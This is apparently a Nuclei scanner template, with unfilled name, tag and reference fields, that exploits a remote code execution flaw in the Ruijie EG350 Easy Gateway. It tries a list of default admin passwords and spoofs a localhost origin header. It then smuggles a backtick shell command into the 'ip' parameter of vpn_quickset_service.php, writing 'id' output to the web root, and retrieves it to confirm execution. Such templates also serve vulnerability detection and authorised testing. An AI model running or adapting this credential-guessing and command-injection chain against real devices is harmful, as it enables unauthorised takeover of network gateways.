id: ruijie-uac-quickset-rce-login
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: The Ruijie EG350 Easy Gateway Management System has a remote code execution vulnerability,which allows attackers to gain server privileges and cause the server to crash.
  reference:
    - https://
  tags: tags
  
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 29
        Accept: application/json, text/javascript, */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/index.htm
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        x-real-ip: 127.0.0.1
        x-forwarded-for: 127.0.0.1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        Connection: close

        username=admin&password={{password}}
      - |-
        POST /itbox_pi/vpn_quickset_service.php?a=set_vpn HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 26
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/old_pub/cache.html
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: {{ruijie_id}}; user=admin; 
        x-real-ip: 127.0.0.1
        x-forwarded-for: 127.0.0.1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        Connection: close

        ip=`id+>/tmp/html/{{filename}}.txt`
      - |+
        GET /{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: {{ruijie_id}}; user=admin; 
        Connection: close
    payloads:
      password:
        - admin@123
        - admin123
        - test
        - 123456
        - admin
        - test@123 
    stop-at-first-match: true
    
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
          
    extractors:
      - type: regex
        name: ruijie_id
        internal: true
        part: header_1
        regex:
          - 'RUIJIEID=([a-zA-Z0-9]+)'
